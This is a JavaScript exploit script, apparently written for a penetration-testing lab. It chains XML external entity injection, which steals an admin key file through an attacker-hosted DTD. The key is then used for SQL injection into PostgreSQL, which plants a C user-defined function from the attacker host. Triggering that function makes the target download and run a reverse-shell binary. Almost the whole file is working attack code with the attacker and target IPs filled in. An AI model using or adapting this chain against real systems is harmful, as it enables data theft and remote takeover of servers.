// ensure and create before running this script reverse.elf
async function exploit() {
  const attacker_ip = '192.168.119.123';
  const host_ip = '192.168.123.251';
  const alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
  let xmldata = `
  <!DOCTYPE data [
    <!ENTITY % start "<![CDATA[">
    <!ENTITY % file SYSTEM "file:///home/student/adminkey.txt" >
    <!ENTITY % end "]]>">
    <!ENTITY % dtd SYSTEM "http://${attacker_ip}/wrapper.dtd" >
    %dtd;
    ]>
    <database><categories><category><name>&wrapper;</name></category></categories></database>
  `;
  config = {
    "method":"POST",
    "credentials":"include",
    mode: "cors",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    }, 
    body:  "preview=true&xmldata="+ encodeURIComponent(xmldata)
  };

  const admin_key = await fetch(`http://${host_ip}/admin/import`, config).then(async response => {
    if(response.status < 400) {
      data = await response.text();
      re = /<!\[CDATA\[.*\s\]\]>/
      key = data.match(re)[0];
      key = key.replace(/<!\[CDATA\[/,'');
      key = key.replace(/\s]]>/,'');
      return key;
    }
  });
  console.log(admin_key);

  urls = [
    // testing
    {
      url: `http://${host_ip}/admin/query`,
      config: {
        "method":"POST",
        "credentials":"include",
        mode: "cors",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        }, 
        body: `adminKey=${admin_key}&query=`+ encodeURIComponent('select version();')
      },
    },
  ]
  // create schema to store udf
  const schema_name = randomString(5, alphabet);
  const table_name = randomString(5, alphabet);
  const loid = `(SELECT loid FROM ${schema_name}.${table_name})`;
  const create_schema_sqli = `CREATE SCHEMA ${schema_name};CREATE TABLE ${schema_name}.${table_name}(loid oid);INSERT INTO ${schema_name}.${table_name}(loid) VALUES ((SELECT lo_creat(-1)));`;
  urls.push(
    {
      url: `http://${host_ip}/admin/query`,
      config: {
        "method":"POST",
        "credentials":"include",
        mode: "cors",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        }, 
        body: `adminKey=${admin_key}&query=`+ encodeURIComponent(create_schema_sqli)
      },
    }
  );
  // objects for writing the udf
  res = await fetch(`http://${attacker_ip}/csharp.txt`,{mode:'cors'});
  let shared_object = await res.text();
  console.log(shared_object);

  const chunk_length = 4096;
  j = 0;
  for(i = 0; i < shared_object.length; i+=chunk_length) {
    /*
    This shit took forever to figure out.
    let s = 'abcdef';
    console.log(s.substring(1,1));
    Guess what that prints? Not 'a'. It prints ''.
    It just goes to show we always have to rtfm.
    I wrote the javascript version of this exploit pretty much copying the logic from the powershell version.
    In powershell substring takes a start index and a length;
    In javascript substring takes a stop and start index;
    RTFM.
    */
    udf_chunk = shared_object.substring(i, i + Math.min(chunk_length, shared_object.length - i));
    console.log('i: ', i);
    console.log('j: ', j);
    console.log('shared_object length', shared_object.length);
    console.log('shared_object length - i', shared_object.length - i);
    console.log('udf chunk length', udf_chunk.length);
    console.log('chunk_length', chunk_length);
    console.log('-----------------------------------------');
    inject_udf_chunk_sql = `INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES (${loid}, ${j}, decode(\$\$${udf_chunk}\$\$, \$\$hex\$\$))`;
    inject_udf_chunk_sql.replace(' ','+');
    ++j;
    urls.push(
      {
        url: `http://${host_ip}/admin/query`,
        config: {
          "method":"POST",
          "credentials":"include",
          mode: "cors",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          }, 
          body: `adminKey=${admin_key}&query=${inject_udf_chunk_sql}`//+encodeURIComponent(inject_udf_chunk_sql)
        },
      }
    );
  }
  
  // export udf
  export_udf_sqli = `SELECT lo_export(${loid}, \$\$\/tmp\/pg_exec.so\$\$)`;
  urls.push(
    {
      url: `http://${host_ip}/admin/query`,
      config: {
        "method":"POST",
        "credentials":"include",
        mode: "cors",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        }, 
        body: `adminKey=${admin_key}&query=`+ encodeURIComponent(export_udf_sqli)
      },
    }
  );
  
  // create udf func
  create_udf_func_sqli = "CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE 'c' STRICT";
  urls.push(
    {
      url: `http://${host_ip}/admin/query`,
      config: {
        "method":"POST",
        "credentials":"include",
        mode: "cors",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        }, 
        body: `adminKey=${admin_key}&query=`+ encodeURIComponent(create_udf_func_sqli)
      },
    }
  );
  // trigger udf
  trigger_udf_sqli = `SELECT sys('wget http://${attacker_ip}/reverse.elf -O /tmp/reverse.elf; chmod +x /tmp/reverse.elf; /tmp/reverse.elf');`;
  // handle the fetch logic
  urls.push(
    {
      url: `http://${host_ip}/admin/query`,
      config: {
        "method":"POST",
        "credentials":"include",
        mode: "cors",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        }, 
        body: `adminKey=${admin_key}&query=`+ encodeURIComponent(trigger_udf_sqli)
      },
    }
  );
  
  // and handle errors
  const handleFetch = async (url,config) => {
    const res = await fetch(url,config).catch(console.error);
    const regex_success = new RegExp('.*<p>An error occurred:.*<\/p></p>');
    const regex_statement_result = new RegExp('.*<pre>.*\s\S.*\s\S\/pre>');
    /*text =  await res.text();
    if(text.match(regex_success)) {
      return text.match(regex)[0]; 
    }
    else if (text.match(regex_statement_result)) {
      return text.match(regex)[0]; 
    }
    return '';
    */
    return res.text();

  }

  // reduce fetches, receives the response
  // of the previous, log it (and maybe use it as input)
  const reduceFetch = async (acc, curr) => {
    const prev = await acc;
    //console.log('previous call:', prev);

    return handleFetch(curr.url, curr.config);
  }

  const pipeFetch = async urls => urls.reduce(reduceFetch, Promise.resolve(''));

  pipeFetch(urls).then(console.log);

}
exploit();
function randomString(length, chars) {
    let result = '';
    for (let i = length; i > 0; --i) result += chars[Math.round(Math.random() * (chars.length - 1))];
    return result;
}